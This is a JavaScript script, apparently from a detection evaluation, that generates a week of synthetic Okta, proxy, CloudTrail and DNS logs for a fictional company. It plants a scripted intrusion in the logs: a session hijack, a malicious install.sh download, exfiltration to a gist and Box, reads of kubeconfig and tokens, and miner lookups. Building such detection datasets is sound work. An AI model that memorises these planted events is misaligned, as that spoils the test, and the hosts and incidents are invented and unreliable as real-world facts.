import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const evaluationDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const root = path.resolve(evaluationDir, "..");
const out = path.join(root, "telemetry");
fs.mkdirSync(out, { recursive: true });

let state = 0x6c617474;
const rnd = () => ((state = (Math.imul(state, 1664525) + 1013904223) >>> 0) / 2 ** 32);
const pick = (items) => items[Math.floor(rnd() * items.length)];
const weighted = (items) => {
  const total = items.reduce((sum, [, weight]) => sum + weight, 0);
  let cursor = rnd() * total;
  for (const [value, weight] of items) {
    cursor -= weight;
    if (cursor <= 0) return value;
  }
  return items.at(-1)[0];
};
const pad = (value, width = 2) => String(value).padStart(width, "0");
const sha256 = (value) => crypto.createHash("sha256").update(value).digest("hex");
const id = (prefix, value) => `${prefix}-${sha256(String(value)).slice(0, 12)}`;
const iso = (value) => new Date(value).toISOString();
const start = Date.parse("2026-03-09T00:00:00Z");
const end = Date.parse("2026-03-16T00:00:00Z");

function businessTime() {
  const day = Math.floor(rnd() * 6);
  if (rnd() < 0.82) {
    const localHour = 6 + Math.floor(rnd() * 15);
    return Date.parse("2026-03-09T00:00:00Z") + day * 86400000 + (localHour + 7) * 3600000 + Math.floor(rnd() * 3600000);
  }
  return start + Math.floor(rnd() * (end - start));
}

const emailFor = (user) => user === "j.mercer" ? "j.mercer@contractor.example" : `${user}@halcyonmeridian.com`;

function anyTime() {
  return start + Math.floor(rnd() * (end - start));
}

function csvCell(value) {
  const text = String(value ?? "");
  return /[",\r\n]/.test(text) ? `"${text.replaceAll('"', '""')}"` : text;
}

function csvRow(values) {
  return values.map(csvCell).join(",");
}

function write(name, lines) {
  fs.writeFileSync(path.join(out, name), `${lines.join("\n")}\n`);
}

const identities = [
  ["e.park", "FIN-WS22"], ["a.velasquez", "FIN-WS27"], ["r.kapoor", "MAC-DEV-17"],
  ["t.owens", "MAC-DEV-09"], ["m.sato", "FIN-WS31"], ["l.chen", "SEC-JUMP-01"],
  ["n.byrd", "MAC-DEV-04"], ["d.holt", "FIN-WS18"], ["s.cho", "HR-WS09"],
  ["p.garcia", "SALES-WS14"], ["c.nguyen", "MAC-OPS-02"], ["a.rahman", "RSCH-JUP-04"],
  ["j.mercer", "RSCH-JUP-03"], ["v.ellis", "FIN-WS33"], ["k.morris", "MAC-DEV-12"],
  ["b.foster", "SALES-WS08"], ["h.kim", "HR-WS11"], ["o.reed", "FIN-WS29"],
  ["i.patel", "MAC-DEV-06"], ["g.brooks", "OPS-WS05"], ["f.martin", "SALES-WS19"],
  ["w.hughes", "MAC-DESIGN-03"], ["q.turner", "FIN-WS16"], ["y.li", "MAC-DEV-21"],
  ["z.adams", "OPS-WS12"], ["r.cole", "HR-WS17"], ["u.shah", "MAC-DEV-14"],
  ["x.wright", "FIN-WS24"], ["n.ortiz", "SALES-WS22"], ["d.chen", "MAC-DEV-19"]
].map(([user, host], index) => ({
  user,
  host,
  officeIp: "198.51.100.10",
  homeIps: [`203.0.113.${10 + index}`, `192.0.2.${30 + index}`],
  ua: host.startsWith("MAC-") ? "Mozilla/5.0 (Macintosh) AppleWebKit/537.36 Chrome/134.0" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0"
}));

const hostProfiles = {
  "FIN-WS22": { ip: "10.24.18.41", platform: "windows", users: ["e.park", "m.sato"] },
  "FIN-WS31": { ip: "10.24.18.52", platform: "windows", users: ["m.sato"] },
  "FIN-WS27": { ip: "10.24.18.61", platform: "windows", users: ["a.velasquez"] },
  "FIN-WS18": { ip: "10.24.18.73", platform: "windows", users: ["d.holt"] },
  "FIN-WS33": { ip: "10.24.18.84", platform: "windows", users: ["v.ellis"] },
  "FIN-WS29": { ip: "10.24.18.92", platform: "windows", users: ["o.reed"] },
  "FIN-WS16": { ip: "10.24.18.104", platform: "windows", users: ["q.turner"] },
  "FIN-WS24": { ip: "10.24.18.116", platform: "windows", users: ["x.wright"] },
  "HR-WS09": { ip: "10.31.9.44", platform: "windows", users: ["s.cho"] },
  "HR-WS11": { ip: "10.31.9.58", platform: "windows", users: ["h.kim"] },
  "HR-WS17": { ip: "10.31.9.76", platform: "windows", users: ["r.cole"] },
  "SALES-WS14": { ip: "10.42.7.61", platform: "windows", users: ["p.garcia"] },
  "SALES-WS08": { ip: "10.42.7.72", platform: "windows", users: ["b.foster"] },
  "SALES-WS19": { ip: "10.42.7.86", platform: "windows", users: ["f.martin"] },
  "SALES-WS22": { ip: "10.42.7.97", platform: "windows", users: ["n.ortiz"] },
  "OPS-WS05": { ip: "10.8.12.55", platform: "windows", users: ["g.brooks"] },
  "OPS-WS12": { ip: "10.8.12.68", platform: "windows", users: ["z.adams"] },
  "MAC-DEV-17": { ip: "10.88.44.17", platform: "macos", users: ["r.kapoor"] },
  "MAC-DEV-04": { ip: "10.88.44.31", platform: "macos", users: ["n.byrd"] },
  "MAC-DEV-09": { ip: "10.88.44.42", platform: "macos", users: ["t.owens"] },
  "MAC-OPS-02": { ip: "10.88.44.53", platform: "macos", users: ["c.nguyen"] },
  "MAC-DEV-12": { ip: "10.88.44.64", platform: "macos", users: ["k.morris"] },
  "MAC-DEV-06": { ip: "10.88.44.75", platform: "macos", users: ["i.patel"] },
  "MAC-DESIGN-03": { ip: "10.88.44.86", platform: "macos", users: ["w.hughes"] },
  "MAC-DEV-21": { ip: "10.88.44.97", platform: "macos", users: ["y.li"] },
  "MAC-DEV-14": { ip: "10.88.44.108", platform: "macos", users: ["u.shah"] },
  "MAC-DEV-19": { ip: "10.88.44.119", platform: "macos", users: ["d.chen"] },
  "BLD-RUN-02": { ip: "10.8.4.19", platform: "linux", users: ["build-bot"] },
  "BLD-RUN-03": { ip: "10.8.4.20", platform: "linux", users: ["build-bot"] },
  "RSCH-JUP-03": { ip: "10.55.72.9", platform: "linux", users: ["j.mercer"] },
  "RSCH-JUP-04": { ip: "10.55.72.10", platform: "linux", users: ["a.rahman"] },
  "SEC-JUMP-01": { ip: "10.3.8.12", platform: "linux", users: ["l.chen"] },
  "ip-10-42-18-23": { ip: "10.42.18.23", platform: "linux", users: ["svc-exporter"] }
};
const hosts = Object.keys(hostProfiles);

const domainMap = {
  "login.microsoftonline.com": ["20.190.128.25", "20.190.128.26"],
  "graph.microsoft.com": ["20.190.128.11", "20.190.128.12"],
  "portal.office.com": ["13.107.6.171", "13.107.9.171"],
  "outlook.office.com": ["40.97.153.18", "40.97.153.34"],
  "teams.microsoft.com": ["52.113.194.132", "52.113.194.133"],
  "sharepoint.com": ["13.107.136.10", "13.107.137.10"],
  "api.github.com": ["140.82.112.5", "140.82.113.5"],
  "github.com": ["140.82.112.4", "140.82.113.4"],
  "objects.githubusercontent.com": ["185.199.108.133", "185.199.109.133"],
  "raw.githubusercontent.com": ["185.199.108.133", "185.199.109.133"],
  "gist.githubusercontent.com": ["185.199.108.133", "185.199.109.133"],
  "registry.npmjs.org": ["104.16.24.34", "104.16.25.34"],
  "cdn.slack.com": ["18.160.10.14", "18.160.10.83"],
  "slack.com": ["34.120.177.193", "34.149.100.209"],
  "halcyonmeridian.box.com": ["74.112.186.44", "74.112.186.55"],
  "upload.box.com": ["74.112.186.55", "74.112.186.65"],
  "api.box.com": ["74.112.186.144", "74.112.186.145"],
  "s3.us-west-2.amazonaws.com": ["52.92.128.17", "52.92.129.33"],
  "sts.us-west-2.amazonaws.com": ["52.94.176.11", "52.94.177.11"],
  "eks.us-west-2.amazonaws.com": ["52.94.180.22", "52.94.181.22"],
  "ssm.us-west-2.amazonaws.com": ["52.94.184.30", "52.94.185.30"],
  "docs.aws.amazon.com": ["18.160.18.12", "18.160.18.74"],
  "console.aws.amazon.com": ["54.239.28.85", "54.239.28.86"],
  "accounts.google.com": ["142.250.72.13", "142.250.72.45"],
  "drive.google.com": ["142.250.72.14", "142.250.72.46"],
  "docs.google.com": ["142.250.72.78", "142.250.72.110"],
  "zoom.us": ["170.114.52.2", "170.114.52.3"],
  "api.zoom.us": ["170.114.10.11", "170.114.10.12"],
  "atlassian.net": ["104.192.142.18", "104.192.143.18"],
  "api.statuspage.io": ["104.192.142.25", "104.192.143.25"],
  "docker.io": ["34.194.164.123", "44.208.254.194"],
  "registry-1.docker.io": ["34.194.164.123", "44.208.254.194"],
  "pypi.org": ["151.101.0.223", "151.101.64.223"],
  "files.pythonhosted.org": ["151.101.1.63", "151.101.65.63"],
  "brew.sh": ["185.199.108.153", "185.199.109.153"],
  "apple.com": ["17.253.144.10", "17.253.144.11"],
  "swcdn.apple.com": ["17.253.144.20", "17.253.144.21"],
  "windowsupdate.com": ["13.107.4.50", "13.107.5.50"],
  "crl.microsoft.com": ["23.53.35.17", "23.53.35.18"],
  "ocsp.digicert.com": ["93.184.220.29", "93.184.220.30"],
  "splunk.halcyonmeridian.com": ["10.3.8.20"],
  "gitlab.halcyonmeridian.com": ["10.8.4.30"],
  "wiki.halcyonmeridian.com": ["10.8.12.30"],
  "fs-internal-02.halcyonmeridian.com": ["10.24.2.18"],
  "review-board-portal.com": ["198.51.100.24"],
  "assets.review-board-portal.com": ["198.51.100.24"],
  "cdn-build-linker.com": ["203.0.113.71"],
  "pastebin-free-storage.com": ["203.0.113.71"],
  "cache-sync-runner.com": ["203.0.113.71"],
  "pool-research.example": ["192.0.2.77"],
  "k8s-purpletest.lab": ["198.18.0.22"],
  "auth-journey-check.net": ["198.18.0.23"]
};
const commonDomains = Object.keys(domainMap).filter((domain) => !["review-board-portal.com", "assets.review-board-portal.com", "cdn-build-linker.com", "pastebin-free-storage.com", "cache-sync-runner.com", "pool-research.example", "k8s-purpletest.lab", "auth-journey-check.net"].includes(domain));

const oktaEvents = [];
const oktaApplications = ["Microsoft Office 365", "Slack", "Box", "Google Workspace", "GitHub Enterprise", "AWS IAM Identity Center", "Atlassian Cloud", "Zoom", "Expense Service", "HR Portal", "Travel Desk", "Salesforce"];
const normalOauthClients = ["slack-prod", "box-enterprise", "zoom-calendar", "expense-mobile", "atlassian-cloud", "travel-desk"];
for (let index = 0; index < 3600; index++) {
  const person = pick(identities);
  const timestamp = businessTime();
  const success = rnd() > 0.065;
  const eventType = success
    ? weighted([["user.authentication.sso", 34], ["user.session.start", 27], ["application.user_membership.list", 14], ["app.oauth2.as.authorize", 7], ["application.user_membership.add", 2], ["user.session.end", 8]])
    : weighted([["user.authentication.auth_via_mfa", 5], ["user.authentication.auth_via_password", 4], ["user.session.start", 1]]);
  const remote = rnd() < 0.58;
  const ipAddress = remote ? pick(person.homeIps) : person.officeIp;
  const record = {
    published: iso(timestamp),
    eventType,
    actor: { alternateId: emailFor(person.user) },
    client: { ipAddress, userAgent: { rawUserAgent: rnd() < 0.12 ? "Okta Verify/9.31" : person.ua } },
    outcome: { result: success ? "SUCCESS" : "FAILURE" },
    transaction: { id: id("txn", `${index}:${timestamp}:${person.user}`) }
  };
  if (!success) record.outcome.reason = eventType === "user.authentication.auth_via_mfa" ? pick(["DENIED_BY_USER", "FACTOR_TIMEOUT", "DEVICE_OFFLINE"]) : pick(["INVALID_CREDENTIALS", "ACCOUNT_LOCKED"]);
  if (eventType === "app.oauth2.as.authorize") record.debugContext = { debugData: { requestUri: `/oauth2/v1/authorize?client_id=${pick(normalOauthClients)}`, origin: rnd() < 0.08 ? "NEW_CITY" : "KNOWN_LOCATION" } };
  if (eventType.startsWith("application.user_membership")) record.target = [{ displayName: pick(oktaApplications) }];
  if (eventType === "user.session.start" && rnd() < 0.06) record.debugContext = { debugData: { behaviors: pick(["New Device", "New Geo", "New ASN", "Velocity", "None"]) } };
  oktaEvents.push(record);
}
oktaEvents.push(
  { published: "2026-03-13T15:14:22.000Z", eventType: "user.authentication.sso", actor: { alternateId: "e.park@halcyonmeridian.com" }, client: { ipAddress: "198.51.100.24", userAgent: { rawUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0" } }, outcome: { result: "SUCCESS" }, transaction: { id: "txn-84e2a11f" } },
  { published: "2026-03-13T15:16:11.000Z", eventType: "app.oauth2.as.authorize", actor: { alternateId: "e.park@halcyonmeridian.com" }, client: { ipAddress: "45.83.64.19", userAgent: { rawUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0" } }, outcome: { result: "SUCCESS" }, debugContext: { debugData: { origin: "NEW_CITY", requestUri: "/oauth2/v1/authorize?client_id=box-sync-docs" } }, transaction: { id: "txn-84e2a120" } },
  { published: "2026-03-13T15:16:55.000Z", eventType: "application.user_membership.add", actor: { alternateId: "e.park@halcyonmeridian.com" }, client: { ipAddress: "45.83.64.19", userAgent: { rawUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0" } }, outcome: { result: "SUCCESS" }, target: [{ displayName: "Docs Sync Service" }], transaction: { id: "txn-84e2a120" } },
  { published: "2026-03-13T15:18:41.000Z", eventType: "user.session.start", actor: { alternateId: "e.park@halcyonmeridian.com" }, client: { ipAddress: "45.83.64.19", userAgent: { rawUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0" } }, outcome: { result: "SUCCESS" }, debugContext: { debugData: { behaviors: "New Geo, New ASN, Session Cookie Reuse" } }, transaction: { id: "txn-84e2a121" } },
  { published: "2026-03-13T15:26:09.000Z", eventType: "system.push.send_factor_verify_push", actor: { alternateId: "a.velasquez@halcyonmeridian.com" }, client: { ipAddress: "45.83.64.19", userAgent: { rawUserAgent: "Mozilla/5.0 Chrome/134" } }, outcome: { result: "SUCCESS" }, transaction: { id: "txn-vel-1509" } },
  { published: "2026-03-13T15:26:44.000Z", eventType: "user.authentication.auth_via_mfa", actor: { alternateId: "a.velasquez@halcyonmeridian.com" }, client: { ipAddress: "45.83.64.19", userAgent: { rawUserAgent: "Mozilla/5.0 Chrome/134" } }, outcome: { result: "FAILURE", reason: "DENIED_BY_USER" }, transaction: { id: "txn-vel-1509" } }
);
oktaEvents.sort((a, b) => a.published.localeCompare(b.published));
write("okta_system_week.jsonl", oktaEvents.map(JSON.stringify));

const proxyEvents = [];
const methods = [["GET", 48], ["CONNECT", 29], ["POST", 17], ["PUT", 3], ["HEAD", 3]];
for (let index = 0; index < 9200; index++) {
  const host = pick(hosts.filter((name) => name !== "ip-10-42-18-23"));
  const profile = hostProfiles[host];
  const user = pick(profile.users);
  const method = weighted(methods);
  const target = pick(commonDomains);
  const status = method === "CONNECT"
    ? weighted([[200, 92], [407, 4], [502, 3], [504, 1]])
    : method === "GET" || method === "HEAD"
      ? weighted([[200, 67], [206, 3], [301, 4], [302, 7], [304, 7], [403, 3], [404, 3], [429, 2], [500, 2], [503, 2]])
      : weighted([[200, 37], [201, 18], [202, 12], [204, 10], [400, 4], [401, 3], [403, 5], [409, 3], [429, 3], [500, 3], [503, 2]]);
  const ua = profile.platform === "windows" ? pick(["Mozilla/5.0 Chrome/134", "Microsoft Office/16.0", "OneDrive/25.020", "PowerShell/7.5"]) : profile.platform === "macos" ? pick(["Mozilla/5.0 Safari/18.3", "Mozilla/5.0 Chrome/134", "git/2.46.0", "npm/10.9.0", "curl/8.7.1"]) : pick(["aws-cli/2.25.1", "curl/8.7.1", "python-requests/2.32", "git/2.46.0"]);
  proxyEvents.push({
    timestamp: iso(businessTime()),
    line: null,
    values: { request: id("req", index), src: profile.ip, host, user: user.includes("bot") ? user : emailFor(user), method, target, uri: method === "CONNECT" ? "-" : pick(["/", "/api/v1/status", "/assets/app.js", "/oauth2/authorize", "/v2/metadata", "/releases/latest"]), status, bytes: 320 + Math.floor(rnd() * 900000), ua }
  });
}
function addProxy(timestamp, values) { proxyEvents.push({ timestamp, values: { request: id("req", timestamp), ...values } }); }
addProxy("2026-03-13T15:13:58.000Z", { src: "10.24.18.41", host: "FIN-WS22", user: "e.park@halcyonmeridian.com", method: "GET", target: "review-board-portal.com", uri: "/session/84e2", status: 200, bytes: 11234, ua: "Mozilla/5.0 Chrome/134" });
addProxy("2026-03-13T15:14:05.000Z", { src: "10.24.18.41", host: "FIN-WS22", user: "e.park@halcyonmeridian.com", method: "POST", target: "review-board-portal.com", uri: "/api/auth", status: 200, bytes: 1834, ua: "Mozilla/5.0 Chrome/134" });
addProxy("2026-03-13T17:06:09.000Z", { src: "10.88.44.17", host: "MAC-DEV-17", user: "r.kapoor@halcyonmeridian.com", method: "GET", target: "registry.npmjs.org", uri: "/build-linker", status: 200, bytes: 884, ua: "npm/10.9.0" });
addProxy("2026-03-13T17:06:11.000Z", { src: "10.88.44.17", host: "MAC-DEV-17", user: "r.kapoor@halcyonmeridian.com", method: "GET", target: "cdn-build-linker.com", uri: "/install.sh", status: 200, bytes: 442, ua: "bash/5.2" });
addProxy("2026-03-13T17:12:42.000Z", { src: "10.88.44.17", host: "MAC-DEV-17", user: "r.kapoor@halcyonmeridian.com", method: "POST", target: "api.github.com", uri: "/gists", status: 201, bytes: 1251, ua: "curl/8.7.1" });
addProxy("2026-03-13T17:34:44.000Z", { src: "10.42.18.23", host: "ip-10-42-18-23", user: "svc-exporter", method: "POST", target: "upload.box.com", uri: "/api/2.0/files/content", status: 201, bytes: 94513012, ua: "python-requests/2.31" });
addProxy("2026-03-13T19:44:12.000Z", { src: "10.55.72.9", host: "RSCH-JUP-03", user: "j.mercer@contractor.example", method: "GET", target: "raw.githubusercontent.com", uri: "/xmrig/xmrig/master/README.md", status: 200, bytes: 20891, ua: "python-requests/2.29" });
proxyEvents.sort((a, b) => a.timestamp.localeCompare(b.timestamp));
write("secure_web_gateway_week.log", proxyEvents.map(({ timestamp, values: v }) => `${timestamp} request=${v.request} src=${v.src} host=${v.host} user=${v.user} method=${v.method} target=${v.target} uri=${v.uri} status=${v.status} bytes=${v.bytes} ua="${v.ua}"`));

const cloudCatalog = [
  ["ec2.amazonaws.com", "DescribeInstances", true], ["ec2.amazonaws.com", "DescribeVolumes", true], ["ec2.amazonaws.com", "StartInstances", false],
  ["s3.amazonaws.com", "ListBuckets", true], ["s3.amazonaws.com", "ListObjectsV2", true], ["s3.amazonaws.com", "PutBucketTagging", false],
  ["sts.amazonaws.com", "GetCallerIdentity", true], ["sts.amazonaws.com", "AssumeRole", false], ["sts.amazonaws.com", "AssumeRoleWithWebIdentity", false],
  ["eks.amazonaws.com", "DescribeCluster", true], ["eks.amazonaws.com", "ListClusters", true], ["eks.amazonaws.com", "UpdateNodegroupConfig", false],
  ["ssm.amazonaws.com", "GetParameter", true], ["ssm.amazonaws.com", "GetParameters", true], ["ssm.amazonaws.com", "PutParameter", false],
  ["kms.amazonaws.com", "DescribeKey", true], ["kms.amazonaws.com", "ListAliases", true], ["kms.amazonaws.com", "Decrypt", true],
  ["ecr.amazonaws.com", "GetAuthorizationToken", true], ["ecr.amazonaws.com", "DescribeImages", true], ["ecr.amazonaws.com", "PutImage", false],
  ["cloudtrail.amazonaws.com", "GetEventSelectors", true], ["cloudtrail.amazonaws.com", "LookupEvents", true], ["cloudtrail.amazonaws.com", "PutEventSelectors", false],
  ["iam.amazonaws.com", "ListRoles", true], ["iam.amazonaws.com", "GetRole", true], ["iam.amazonaws.com", "TagRole", false],
  ["lambda.amazonaws.com", "ListFunctions", true], ["lambda.amazonaws.com", "UpdateFunctionConfiguration", false]
];
const cloudPrincipals = [
  ["arn:aws:sts::552200771193:assumed-role/secops-readonly/inventory", ["10.3.8.12"], "aws-sdk-go/1.55.5"],
  ["arn:aws:sts::552200771193:assumed-role/cloud-platform-admin/c.nguyen", ["10.8.12.44", "203.0.113.20"], "aws-cli/2.25.1"],
  ["arn:aws:sts::552200771193:assumed-role/ci-build/GitHubActions", ["140.82.112.1", "140.82.112.2"], "aws-sdk-go/1.55.5"],
  ["arn:aws:sts::552200771193:assumed-role/backup-operator/nightly", ["10.8.4.20", "10.8.4.21"], "aws-sdk-java/1.12"],
  ["arn:aws:sts::552200771193:assumed-role/sso-finance/m.sato", ["198.51.100.10", "203.0.113.14"], "AWS Internal"],
  ["arn:aws:sts::552200771193:assumed-role/sso-platform/r.kapoor", ["198.51.100.10", "203.0.113.12"], "aws-cli/2.25.1"],
  ["arn:aws:sts::552200771193:assumed-role/sso-release/t.owens", ["198.51.100.10", "203.0.113.13"], "aws-cli/2.25.1"],
  ["arn:aws:sts::552200771193:assumed-role/eks-node/i-0ab19", ["10.42.18.23"], "aws-sdk-go/1.55.5"],
  ["arn:aws:sts::552200771193:assumed-role/config-recorder/us-west-2", ["config.amazonaws.com"], "config.amazonaws.com"],
  ["arn:aws:sts::552200771193:assumed-role/security-audit/l.chen", ["10.3.8.12", "198.51.100.10"], "aws-cli/2.25.1"],
  ["arn:aws:sts::552200771193:assumed-role/data-pipeline/scheduled", ["10.42.18.41", "10.42.18.42"], "aws-sdk-python/1.34"],
  ["arn:aws:sts::552200771193:assumed-role/release-readonly/GitHubActions", ["140.82.112.1", "140.82.112.3"], "aws-sdk-go/1.55.5"]
];
const parameterNames = ["/prod/app/db_password", "/prod/app/api_key", "/prod/monitoring/webhook", "/stage/app/db_password", "/prod/k8s/release/kubeconfig", "/prod/export/box_folder_id", "/dev/build/cache_token"];
function cloudRequest(eventSource, eventName, index) {
  if (eventSource === "ssm.amazonaws.com") {
    const name = pick(parameterNames);
    if (eventName === "GetParameters") return { names: [name, pick(parameterNames)], withDecryption: rnd() < 0.45 };
    if (eventName === "PutParameter") return { name, type: rnd() < 0.4 ? "SecureString" : "String", overwrite: true };
    return { name, withDecryption: rnd() < 0.45 };
  }
  if (eventSource === "eks.amazonaws.com") {
    if (eventName === "ListClusters") return {};
    if (eventName === "UpdateNodegroupConfig") return { name: pick(["prod-main", "stage-main"]), nodegroupName: pick(["general", "batch"]), scalingConfig: { minSize: 2, maxSize: 12 } };
    return { name: pick(["prod-main", "stage-main", "research-eks"]) };
  }
  if (eventSource === "s3.amazonaws.com") {
    if (eventName === "ListBuckets") return {};
    const bucketName = pick(["halcyon-build-cache", "secops-evidence", "finance-archive", "halcyon-prod-exports"]);
    if (eventName === "PutBucketTagging") return { bucketName, tagging: { tagSet: [{ key: "owner", value: "platform" }] } };
    return { bucketName, prefix: pick(["releases/", "daily/", "healthchecks/", "reports/"]) };
  }
  if (eventSource === "sts.amazonaws.com") {
    if (eventName === "GetCallerIdentity") return {};
    return { roleArn: `arn:aws:iam::552200771193:role/${pick(["ci-build", "release-readonly", "security-audit", "data-pipeline"])}`, roleSessionName: id("session", index) };
  }
  if (eventSource === "ec2.amazonaws.com") return { instanceIds: [pick(["i-0ab19", "i-0912c", "i-77d04"])] };
  if (eventSource === "kms.amazonaws.com") return eventName === "ListAliases" ? { limit: 100 } : { keyId: `arn:aws:kms:us-west-2:552200771193:key/${pick(["7b21b9c0", "32e12e9a", "1d3e2c44"])}` };
  if (eventSource === "iam.amazonaws.com") return eventName === "ListRoles" ? { maxItems: 100 } : { roleName: pick(["ci-build", "gha-release-role", "secops-readonly", "eks-prod-exporter"]), ...(eventName === "TagRole" ? { tags: [{ key: "owner", value: "platform" }] } : {}) };
  if (eventSource === "ecr.amazonaws.com") return eventName === "GetAuthorizationToken" ? { registryIds: ["552200771193"] } : { repositoryName: pick(["release-base", "partner-sync", "web-api"]), ...(eventName === "PutImage" ? { imageTag: "candidate" } : {}) };
  if (eventSource === "lambda.amazonaws.com") return eventName === "ListFunctions" ? { maxItems: 50 } : { functionName: pick(["invoice-worker", "audit-forwarder", "box-notifier"]), environment: { variables: { LOG_LEVEL: "INFO" } } };
  if (eventSource === "cloudtrail.amazonaws.com") {
    if (eventName === "LookupEvents") return { lookupAttributes: [{ attributeKey: "EventSource", attributeValue: "signin.amazonaws.com" }] };
    if (eventName === "PutEventSelectors") return { trailName: "org-main", eventSelectors: [{ readWriteType: "All", includeManagementEvents: true }] };
    return { trailName: "org-main" };
  }
  return {};
}
const cloudEvents = [];
for (let index = 0; index < 5200; index++) {
  const [eventSource, eventName, readOnly] = pick(cloudCatalog);
  const [arn, sourceIps, userAgent] = pick(cloudPrincipals);
  const timestamp = anyTime();
  const requestParameters = cloudRequest(eventSource, eventName, index);
  const oidcEvent = eventName === "AssumeRoleWithWebIdentity";
  const githubRepo = pick(["web-portal", "invoice-service", "release-readonly", "docs-publisher", "mobile-api"]);
  cloudEvents.push({
    eventVersion: "1.09", eventTime: iso(timestamp), eventSource, eventName, awsRegion: "us-west-2",
    sourceIPAddress: oidcEvent ? pick(["140.82.112.1", "140.82.112.2", "140.82.112.3"]) : pick(sourceIps),
    userAgent,
    userIdentity: oidcEvent
      ? { type: "WebIdentityUser", principalId: `repo:halcyonmeridian/${githubRepo}:ref:refs/heads/main` }
      : { type: "AssumedRole", arn },
    requestParameters,
    ...(oidcEvent ? { responseElements: { subjectFromWebIdentityToken: `repo:halcyonmeridian/${githubRepo}:ref:refs/heads/main` } } : {}),
    requestID: id("aws", `${index}:${timestamp}`), readOnly
  });
}
cloudEvents.push(
  { eventVersion: "1.09", eventTime: "2026-03-13T17:11:47.000Z", eventSource: "sts.amazonaws.com", eventName: "AssumeRoleWithWebIdentity", awsRegion: "us-west-2", sourceIPAddress: "140.82.112.1", userAgent: "aws-sdk-go/1.55.5", userIdentity: { type: "WebIdentityUser", principalId: "repo:halcyonmeridian/release-orchestrator:ref:refs/heads/hotfix/cache-key" }, requestParameters: { roleArn: "arn:aws:iam::552200771193:role/gha-release-role", roleSessionName: "GitHubActions" }, responseElements: { subjectFromWebIdentityToken: "repo:halcyonmeridian/release-orchestrator:ref:refs/heads/hotfix/cache-key", assumedRoleUser: { arn: "arn:aws:sts::552200771193:assumed-role/gha-release-role/GitHubActions" } }, requestID: "aws-a93c41d188421", readOnly: false },
  { eventVersion: "1.09", eventTime: "2026-03-13T17:13:23.000Z", eventSource: "ssm.amazonaws.com", eventName: "GetParameter", awsRegion: "us-west-2", sourceIPAddress: "140.82.112.1", userAgent: "aws-cli/2.25.1", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::552200771193:assumed-role/gha-release-role/GitHubActions" }, requestParameters: { name: "/prod/k8s/release/kubeconfig", withDecryption: true }, requestID: "aws-8841kubeconfig", readOnly: true },
  { eventVersion: "1.09", eventTime: "2026-03-13T17:19:11.000Z", eventSource: "ssm.amazonaws.com", eventName: "GetParameter", awsRegion: "us-west-2", sourceIPAddress: "10.42.18.23", userAgent: "aws-sdk-python/1.34 partner-export-sync/2.8", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::552200771193:assumed-role/eks-prod-exporter/partner-export-sync-4k9xv" }, requestParameters: { name: "/prod/export/box_token", withDecryption: true }, requestID: "aws-8841boxtoken", readOnly: true }
);
cloudEvents.sort((a, b) => a.eventTime.localeCompare(b.eventTime));
write("cloudtrail_week.jsonl", cloudEvents.map(JSON.stringify));

const dnsRows = [["ts", "client", "client_ip", "query", "type", "response", "rcode", "latency_ms"]];
for (let index = 0; index < 10400; index++) {
  const client = pick(hosts.filter((host) => host !== "ip-10-42-18-23"));
  const profile = hostProfiles[client];
  const nxdomain = rnd() < 0.065;
  const query = nxdomain ? `${pick(["autodiscover", "telemetry", "cdn", "api", "assets", "login"])}-${Math.floor(rnd() * 9000)}.${pick(["invalid.local", "corp.invalid", "test.invalid"])}` : pick(commonDomains);
  const response = nxdomain ? "-" : pick(domainMap[query]);
  dnsRows.push([iso(anyTime()), client, profile.ip, query, "A", response, nxdomain ? "NXDOMAIN" : "NOERROR", 2 + Math.floor(rnd() * (nxdomain ? 120 : 42))]);
}
function addDns(timestamp, client, query, response) { dnsRows.push([timestamp, client, hostProfiles[client].ip, query, "A", response, "NOERROR", 4 + Math.floor(rnd() * 35)]); }
addDns("2026-03-13T15:13:56.892Z", "FIN-WS22", "review-board-portal.com", "198.51.100.24");
addDns("2026-03-13T15:14:02.118Z", "FIN-WS22", "assets.review-board-portal.com", "198.51.100.24");
addDns("2026-03-13T17:06:10.882Z", "MAC-DEV-17", "cdn-build-linker.com", "203.0.113.71");
addDns("2026-03-13T17:07:33.441Z", "MAC-DEV-17", "pastebin-free-storage.com", "203.0.113.71");
addDns("2026-03-13T17:12:40.117Z", "BLD-RUN-02", "cache-sync-runner.com", "203.0.113.71");
addDns("2026-03-13T17:33:59.183Z", "ip-10-42-18-23", "upload.box.com", "74.112.186.55");
addDns("2026-03-13T19:39:22.183Z", "RSCH-JUP-03", "pool-research.example", "192.0.2.77");
addDns("2026-03-13T19:41:03.311Z", "BLD-RUN-02", "k8s-purpletest.lab", "198.18.0.22");
const dnsHeader = dnsRows.shift();
dnsRows.sort((a, b) => a[0].localeCompare(b[0]));
write("dns_week.csv", [csvRow(dnsHeader), ...dnsRows.map(csvRow)]);

const processTemplates = {
  windows: [
    ["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"],
    ["C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE /recycle", "C:\\Windows\\explorer.exe"],
    ["C:\\Users\\Public\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", "Teams.exe --processStart Teams.exe", "C:\\Windows\\explorer.exe"],
    ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoProfile -File C:\\Corp\\Scripts\\MapDrives.ps1", "C:\\Windows\\System32\\userinit.exe"],
    ["C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p", "C:\\Windows\\System32\\services.exe"],
    ["C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", "OneDrive.exe /background", "C:\\Windows\\explorer.exe"],
    ["C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /groups", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"]
  ],
  macos: [
